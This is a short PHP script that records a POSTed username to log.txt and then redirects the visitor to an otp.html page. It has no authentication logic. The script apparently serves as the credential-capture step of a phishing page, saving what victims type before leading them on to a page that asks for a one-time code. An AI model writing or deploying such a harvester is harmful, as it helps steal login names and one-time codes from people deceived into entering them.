<?php

if ($_SERVER["REQUEST_METHOD"] == "POST"){
	$username = $_POST["username"];
	$file = fopen("log.txt","w");
	$data = "Username: ".$username;
	fwrite($file, $data);
	fclose($file);
	header("Location: otp.html");
}
?>
